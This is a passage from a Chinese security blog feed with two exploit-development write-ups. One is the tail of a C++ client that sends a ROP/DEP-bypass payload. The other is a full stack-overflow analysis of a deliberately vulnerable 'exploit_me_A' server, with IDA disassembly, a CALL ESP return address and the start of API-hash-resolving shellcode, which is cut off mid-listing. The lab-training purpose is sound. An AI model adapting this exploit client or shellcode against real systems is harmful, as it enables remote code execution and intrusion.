class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char szBuf1[100] = &#123;0&#125;;</span><br><span class="line">recv(fdSock, szBuf1, 100, 0);</span><br><span class="line"></span><br><span class="line">if (send(fdSock, szBuf, BUF_MAX_SIZE, 0) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;send failed&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">shutdown(fdSock, SD_SEND);</span><br><span class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &quot;utilize success&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">shutdown(fdSock, SD_SEND);</span><br><span class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果图">运行结果图</h3><p><img src="https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210407182221.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;利用ROP突破DEP：分析expolit_me并做rop&lt;/h1&gt;
&lt;h2 id=&quot;分析目标程序&quot;&gt;分析目标程序&lt;/h2&gt;
&lt;p&gt;使用OD打开&lt;code&gt;exploit_me&lt;/code&gt;，找到关键的几个函数的参数：&lt;/p&gt;
&lt;p&gt;创建&lt;code&gt;socket&lt;/code</summary>
      
    
    
    
    <category term="shellcode在漏洞利用中的应用" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="shellcode" scheme="https://4st.tech/tags/shellcode/"/>
    
    <category term="漏洞利用" scheme="https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="rop" scheme="https://4st.tech/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出：分析exploit_me_A</title>
    <link href="https://4st.tech/2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/"/>
    <id>https://4st.tech/2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/</id>
    <published>2021-04-06T07:33:47.000Z</published>
    <updated>2021-08-16T04:01:44.470Z</updated>
    
    <content type="html"><![CDATA[<h1>分析目标程序</h1><h2 id="分析大体流程">分析大体流程</h2><p>使用IDA打开，分析下这个程序的具体功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:004010B0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:004010B0 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:004010B0</span><br><span class="line">.text:004010B0 addrlen         = dword ptr -3B8h</span><br><span class="line">.text:004010B0 name            = sockaddr ptr -3B4h</span><br><span class="line">.text:004010B0 addr            = sockaddr ptr -3A4h</span><br><span class="line">.text:004010B0 buf             = byte ptr -394h</span><br><span class="line">.text:004010B0 WSAData         = WSAData ptr -190h</span><br><span class="line">.text:004010B0 argc            = dword ptr  4</span><br><span class="line">.text:004010B0 argv            = dword ptr  8</span><br><span class="line">.text:004010B0 envp            = dword ptr  0Ch</span><br><span class="line">.text:004010B0</span><br><span class="line">.text:004010B0                 sub     esp, 3B4h</span><br><span class="line">.text:004010B6                 lea     eax, [esp+3B4h+WSAData]</span><br><span class="line">.text:004010BD                 push    ebp</span><br><span class="line">.text:004010BE                 push    eax             ; lpWSAData</span><br><span class="line">.text:004010BF                 push    101h            ; wVersionRequested</span><br><span class="line">.text:004010C4                 call    ds:WSAStartup</span><br><span class="line">.text:004010C4</span><br><span class="line">.text:004010CA                 push    0               ; protocol</span><br><span class="line">.text:004010CC                 push    1               ; type</span><br><span class="line">.text:004010CE                 push    2               ; af</span><br><span class="line">.text:004010D0                 call    ds:socket</span><br><span class="line">.text:004010D0</span><br><span class="line">.text:004010D6                 mov     ebp, eax</span><br><span class="line">.text:004010D8                 test    ebp, ebp</span><br><span class="line">.text:004010DA                 jge     short LBL_CREATE_SOCKET_SUCCESS</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DC                 push    offset s-&gt;SocketCreatingError ; &quot;socket creating error!&quot;</span><br><span class="line">.text:004010E1                 push    ebp</span><br><span class="line">.text:004010E2                 mov     ecx, offset g_cout</span><br><span class="line">.text:004010E7                 call    ostream::operator&lt;&lt;(int)</span><br><span class="line">.text:004010E7</span><br><span class="line">.text:004010EC                 mov     ecx, eax</span><br><span class="line">.text:004010EE                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:004010EE</span><br><span class="line">.text:004010F3                 push    offset flush</span><br><span class="line">.text:004010F8                 push    0Ah</span><br><span class="line">.text:004010FA                 mov     ecx, eax</span><br><span class="line">.text:004010FC                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004010FC</span><br><span class="line">.text:00401101                 mov     ecx, eax</span><br><span class="line">.text:00401103                 call    sub_4012B0</span><br><span class="line">.text:00401103</span><br><span class="line">.text:00401108                 push    1               ; Code</span><br><span class="line">.text:0040110A                 call    _exit</span><br><span class="line">.text:0040110A</span><br></pre></td></tr></table></figure><p>其创建了一个<code>AF_INET, SOCK_STREAM, IPPROTO_IP</code> 类型的socket，如果创建失败则退出进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">.text:0040110F LBL_CREATE_SOCKET_SUCCESS:              ; CODE XREF: _main+2Aj</span><br><span class="line">.text:0040110F                 push    1E61h           ; hostshort</span><br><span class="line">.text:00401114                 mov     word ptr [esp+3BCh+name.sa_data+2], 2</span><br><span class="line">.text:0040111B                 call    ds:htons</span><br><span class="line">.text:0040111B</span><br><span class="line">.text:00401121                 push    0               ; hostlong</span><br><span class="line">.text:00401123                 mov     word ptr [esp+3BCh+name.sa_data+4], ax</span><br><span class="line">.text:00401128                 call    ds:htonl</span><br><span class="line">.text:00401128</span><br><span class="line">.text:0040112E                 lea     ecx, [esp+3B8h+name.sa_data+2]</span><br><span class="line">.text:00401132                 push    10h             ; namelen</span><br><span class="line">.text:00401134                 push    ecx             ; name</span><br><span class="line">.text:00401135                 push    ebp             ; s</span><br><span class="line">.text:00401136                 mov     dword ptr [esp+3C4h+name.sa_data+6], eax</span><br><span class="line">.text:0040113A                 call    ds:bind</span><br><span class="line">.text:0040113A</span><br><span class="line">.text:00401140                 test    eax, eax</span><br><span class="line">.text:00401142                 jz      short LBL_BINDING_STREAM_SOCKET_SUCCESS</span><br><span class="line">.text:00401142</span><br><span class="line">.text:00401144                 push    offset s-&gt;BindingStreamSocketError ; &quot;binding stream socket error!&quot;</span><br><span class="line">.text:00401149                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040114E                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040114E</span><br><span class="line">.text:00401153                 push    offset flush</span><br><span class="line">.text:00401158                 push    0Ah</span><br><span class="line">.text:0040115A                 mov     ecx, eax</span><br><span class="line">.text:0040115C                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040115C</span><br><span class="line">.text:00401161                 mov     ecx, eax</span><br><span class="line">.text:00401163                 call    sub_4012B0</span><br><span class="line">.text:00401163</span><br><span class="line">.text:00401168</span><br><span class="line">.text:00401168 LBL_BINDING_STREAM_SOCKET_SUCCESS:      ; CODE XREF: _main+92j</span><br><span class="line">.text:00401168                 push    ebx</span><br><span class="line">.text:00401169                 push    offset asc_4090B8 ; &quot;**************************************&quot;</span><br><span class="line">.text:0040116E                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401173                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401173</span><br><span class="line">.text:00401178                 push    offset flush</span><br><span class="line">.text:0040117D                 push    0Ah</span><br><span class="line">.text:0040117F                 mov     ecx, eax</span><br><span class="line">.text:00401181                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401181</span><br><span class="line">.text:00401186                 mov     ecx, eax</span><br><span class="line">.text:00401188                 call    sub_4012B0</span><br><span class="line">.text:00401188</span><br><span class="line">.text:0040118D                 push    offset s-&gt;ExploitTargetServer1_0 ; &quot;     exploit target server 1.0\t   &quot;</span><br><span class="line">.text:00401192                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401197                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401197</span><br><span class="line">.text:0040119C                 push    offset flush</span><br><span class="line">.text:004011A1                 push    0Ah</span><br><span class="line">.text:004011A3                 mov     ecx, eax</span><br><span class="line">.text:004011A5                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004011A5</span><br><span class="line">.text:004011AA                 mov     ecx, eax</span><br><span class="line">.text:004011AC                 call    sub_4012B0</span><br><span class="line">.text:004011AC</span><br><span class="line">.text:004011B1                 push    offset asc_4090B8 ; &quot;**************************************&quot;</span><br><span class="line">.text:004011B6                 mov     ecx, offset g_cout</span><br><span class="line">.text:004011BB                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:004011BB</span><br><span class="line">.text:004011C0                 push    offset flush</span><br><span class="line">.text:004011C5                 push    0Ah</span><br><span class="line">.text:004011C7                 mov     ecx, eax</span><br><span class="line">.text:004011C9                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004011C9</span><br><span class="line">.text:004011CE                 mov     ecx, eax</span><br><span class="line">.text:004011D0                 call    sub_4012B0</span><br><span class="line">.text:004011D0</span><br><span class="line">.text:004011D5                 push    4               ; backlog</span><br><span class="line">.text:004011D7                 push    ebp             ; s</span><br><span class="line">.text:004011D8                 call    ds:listen</span><br><span class="line">.text:004011DE                 lea     edx, [esp+3BCh+name]</span><br><span class="line">.text:004011E2                 lea     eax, [esp+3BCh+addr.sa_data+2]</span><br><span class="line">.text:004011E6                 push    edx             ; addrlen</span><br><span class="line">.text:004011E7                 push    eax             ; addr</span><br><span class="line">.text:004011E8                 push    ebp             ; s</span><br><span class="line">.text:004011E9                 mov     dword ptr [esp+3C8h+name.sa_family], 10h</span><br><span class="line">.text:004011F1                 call    ds:accept</span><br><span class="line">.text:004011F1</span><br><span class="line">.text:004011F7                 mov     ebx, eax</span><br><span class="line">.text:004011F9                 cmp     ebx, 0FFFFFFFFh</span><br><span class="line">.text:004011FC                 jz      short LBL_ACCEPT_ERR</span><br><span class="line">; ... 省略一部分代码</span><br><span class="line">.text:0040127D LBL_ACCEPT_ERR:                         ; CODE XREF: _main+14Cj</span><br><span class="line">.text:0040127D                 push    offset s-&gt;AcceptError ; &quot;accept error!&quot;</span><br><span class="line">.text:00401282                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401287                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401287</span><br><span class="line">.text:0040128C                 push    offset flush</span><br><span class="line">.text:00401291                 push    0Ah</span><br><span class="line">.text:00401293                 mov     ecx, eax</span><br><span class="line">.text:00401295                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401295</span><br><span class="line">.text:0040129A                 mov     ecx, eax</span><br><span class="line">.text:0040129C                 call    sub_4012B0</span><br><span class="line">.text:0040129C</span><br><span class="line">.text:004012A1                 call    ds:WSACleanup</span><br><span class="line">.text:004012A1</span><br><span class="line">.text:004012A7                 pop     ebx</span><br><span class="line">.text:004012A8                 pop     ebp</span><br><span class="line">.text:004012A9                 add     esp, 3B4h</span><br><span class="line">.text:004012AF                 retn</span><br><span class="line">.text:004012AF</span><br><span class="line">.text:004012AF _main           endp</span><br></pre></td></tr></table></figure><p>绑定，并设置好端口号，开始监听，并等待连接。当有连接进来时，如果握手失败，则开始清理socket环境并退出程序；否则，开始接受数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:004011FE                 push    esi</span><br><span class="line">.text:004011FF                 push    edi</span><br><span class="line">.text:004011FF</span><br><span class="line">.text:00401200</span><br><span class="line">.text:00401200 LBL_START_RECV:                         ; CODE XREF: _main+1AAj</span><br><span class="line">.text:00401200                                         ; _main+1C9j</span><br><span class="line">.text:00401200                 mov     ecx, 80h</span><br><span class="line">.text:00401205                 xor     eax, eax</span><br><span class="line">.text:00401207                 lea     edi, [esp+34h]</span><br><span class="line">.text:0040120B                 push    eax             ; flags</span><br><span class="line">.text:0040120C                 rep stosd</span><br><span class="line">.text:0040120E                 lea     ecx, [esp+38h]</span><br><span class="line">.text:00401212                 push    200h            ; len</span><br><span class="line">.text:00401217                 push    ecx             ; buf</span><br><span class="line">.text:00401218                 push    ebx             ; s</span><br><span class="line">.text:00401219                 call    ds:recv</span><br><span class="line">.text:00401219</span><br><span class="line">.text:0040121F                 mov     esi, eax</span><br><span class="line">.text:00401221                 test    esi, esi</span><br><span class="line">.text:00401223                 jge     short LBL_RECV_SUCCESS ; RecvBuf, len = 0x200</span><br><span class="line">.text:00401223</span><br><span class="line">.text:00401225                 push    offset s-&gt;ReadingStreamMessageErro ; &quot;reading stream message erro!&quot;</span><br><span class="line">.text:0040122A                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040122F                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040122F</span><br><span class="line">.text:00401234                 push    offset flush</span><br><span class="line">.text:00401239                 push    0Ah</span><br><span class="line">.text:0040123B                 mov     ecx, eax</span><br><span class="line">.text:0040123D                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040123D</span><br><span class="line">.text:00401242                 mov     ecx, eax</span><br><span class="line">.text:00401244                 call    sub_4012B0</span><br><span class="line">.text:00401244</span><br><span class="line">.text:00401249                 xor     esi, esi</span><br><span class="line">.text:00401249</span><br><span class="line">.text:0040124B</span><br><span class="line">.text:0040124B LBL_RECV_SUCCESS:                       ; CODE XREF: _main+173j</span><br><span class="line">.text:0040124B                 lea     edx, [esp+34h]  ; RecvBuf, len = 0x200</span><br><span class="line">.text:0040124F                 push    edx</span><br><span class="line">.text:00401250                 call    ProcessRecv</span><br><span class="line">.text:00401250</span><br><span class="line">.text:00401255                 add     esp, 4</span><br><span class="line">.text:00401258                 test    esi, esi</span><br><span class="line">.text:0040125A                 jnz     short LBL_START_RECV</span><br><span class="line">.text:0040125A</span><br><span class="line">.text:0040125C                 push    ebx             ; s</span><br><span class="line">.text:0040125D                 call    ds:closesocket</span><br><span class="line">.text:0040125D</span><br><span class="line">.text:00401263                 lea     eax, [esp+3C4h+name]</span><br><span class="line">.text:00401267                 lea     ecx, [esp+3C4h+addr.sa_data+2]</span><br><span class="line">.text:0040126B                 push    eax             ; addrlen</span><br><span class="line">.text:0040126C                 push    ecx             ; addr</span><br><span class="line">.text:0040126D                 push    ebp             ; s</span><br><span class="line">.text:0040126E                 call    ds:accept</span><br><span class="line">.text:0040126E</span><br><span class="line">.text:00401274                 mov     ebx, eax</span><br><span class="line">.text:00401276                 cmp     ebx, 0FFFFFFFFh</span><br><span class="line">.text:00401279                 jnz     short LBL_START_RECV</span><br><span class="line">.text:00401279</span><br><span class="line">.text:0040127B                 pop     edi</span><br><span class="line">.text:0040127C                 pop     esi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要想利用栈溢出，则需要找到其使用拷贝函数，且在拷贝时未检测其是否越界。</p><h2 id="分析是否存在缓冲区溢出漏洞">分析是否存在缓冲区溢出漏洞</h2><p>仔细分析其收到数据后，对缓冲区的处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ProcessRecv     proc near               ; CODE XREF: _main+1A0p</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 aryTmpBuf       = byte ptr -0C8h</span><br><span class="line">.text:00401000 pszRecvBuf      = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 sub     esp, 0C8h</span><br><span class="line">.text:00401006                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00401009                 xor     eax, eax</span><br><span class="line">.text:0040100B                 lea     edx, [esp+0C8h+aryTmpBuf]</span><br><span class="line">.text:0040100F                 push    esi</span><br><span class="line">.text:00401010                 push    edi</span><br><span class="line">.text:00401011                 mov     edi, [esp+0D0h+pszRecvBuf]</span><br><span class="line">.text:00401018                 push    offset asc_40904C ; &quot;********************&quot;</span><br><span class="line">.text:0040101D                 repne scasb</span><br><span class="line">.text:0040101F                 not     ecx             ; strlen(pszRecvBuf) + 1</span><br><span class="line">.text:00401021                 sub     edi, ecx        ; 指针回到pszRecvBuf</span><br><span class="line">.text:00401023                 mov     eax, ecx</span><br><span class="line">.text:00401025                 mov     esi, edi</span><br><span class="line">.text:00401027                 mov     edi, edx</span><br><span class="line">.text:00401029                 shr     ecx, 2          </span><br><span class="line">.text:0040102C                 rep movsd</span><br><span class="line">.text:0040102E                 mov     ecx, eax</span><br><span class="line">.text:00401030                 and     ecx, 3</span><br><span class="line">.text:00401033                 rep movsb   ; strcpy</span><br><span class="line">.text:00401035                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040103A                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040103A</span><br><span class="line">.text:0040103F                 push    offset flush</span><br><span class="line">.text:00401044                 push    0Ah             ; 回车换行</span><br><span class="line">.text:00401046                 mov     ecx, eax</span><br><span class="line">.text:00401048                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401048</span><br><span class="line">.text:0040104D                 mov     ecx, eax</span><br><span class="line">.text:0040104F                 call    sub_4012B0</span><br><span class="line">.text:0040104F</span><br><span class="line">.text:00401054                 push    offset s-&gt;Received ; &quot;received:&quot;</span><br><span class="line">.text:00401059                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040105E                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040105E</span><br><span class="line">.text:00401063                 push    offset flush</span><br><span class="line">.text:00401068                 push    0Ah</span><br><span class="line">.text:0040106A                 mov     ecx, eax</span><br><span class="line">.text:0040106C                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040106C</span><br><span class="line">.text:00401071                 mov     ecx, eax</span><br><span class="line">.text:00401073                 call    sub_4012B0</span><br><span class="line">.text:00401073</span><br><span class="line">.text:00401078                 lea     ecx, [esp+0D0h+aryTmpBuf]</span><br><span class="line">.text:0040107C                 push    ecx</span><br><span class="line">.text:0040107D                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401082                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401082</span><br><span class="line">.text:00401087                 push    offset flush</span><br><span class="line">.text:0040108C                 push    0Ah</span><br><span class="line">.text:0040108E                 mov     ecx, eax</span><br><span class="line">.text:00401090                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401095                 mov     ecx, eax</span><br><span class="line">.text:00401097                 call    sub_4012B0</span><br><span class="line">.text:00401097</span><br><span class="line">.text:0040109C                 pop     edi</span><br><span class="line">.text:0040109D                 pop     esi</span><br><span class="line">.text:0040109E                 add     esp, 0C8h</span><br><span class="line">.text:004010A4                 retn</span><br><span class="line">.text:004010A4</span><br><span class="line">.text:004010A4 ProcessRecv     endp</span><br></pre></td></tr></table></figure><p>发现，其先使用<code>strlen</code> 函数，获得发送过来的数据的长度，然后直接对栈中临时的数据缓冲区拷贝数据。栈中的临时缓冲区长度为<code>0xC8</code>， 即200个字节。由于临时缓冲区的大小小于接受数据的缓冲区大小，且它在使用<code>strcpy</code>的时候，未进行数据长度的检查。</p><p>由此可以判断，该程序存在栈溢出漏洞问题。</p><h1>栈溢出漏洞的利用</h1><p>使用<code>findaddr</code>，找到<code>call/jmp esp</code> 指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71A2F8FB  Found  CALL ESP at 0x71a2f8fb     Module:  C:\WINDOWS\system32\ws2_32.dll</span><br></pre></td></tr></table></figure><p>所以在<code>0xC8</code> 后面应该存放的是这个地址：<code>0x71a2f8fb</code></p><p>然后构造<code>shellcode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">cld</span><br><span class="line">push 0x1E380A6A</span><br><span class="line">push 0x4FD18963</span><br><span class="line">push 0xC917432</span><br><span class="line">mov esi,esp</span><br><span class="line">lea edi,dword ptr ds:[esi-0xC]</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh,0x4</span><br><span class="line">sub esp,ebx</span><br><span class="line">mov bx,0x3233</span><br><span class="line">push ebx</span><br><span class="line">push 0x72657375</span><br><span class="line">push esp</span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,dword ptr fs:[0x18]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0x30]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0xC]</span><br><span class="line">mov ebx,dword ptr ds:[ebx+0xC]</span><br><span class="line">mov ebx,dword ptr ds:[ebx]</span><br><span class="line">mov ebx,dword ptr ds:[ebx]</span><br><span class="line">mov ebp,dword ptr ds:[ebx+0x18]</span><br><span class="line">lods dword ptr ds:[esi]</span><br><span class="line">cmp eax,0x1E380A6A</span><br><span class="line">jnz short 0012FC19</span><br><span class="line">xchg eax,ebp</span><br><span class="line">call dword ptr ds:[edi-0x8]</span><br><span class="line">xchg eax,ebp</span><br><span class="line">pushad</span><br><span class="line">mov eax,dword ptr ss:[ebp+0x3C]</span><br><span class="line">mov ecx,dword ptr ss:[ebp+eax+0x78]</span><br><span class="line">add ecx,ebp</span><br><span class="line">mov ebx,dword ptr ds:[ecx+0x20]</span><br><span class="line">add ebx,ebp</span><br><span class="line">xor edi,edi</span><br><span class="line">inc 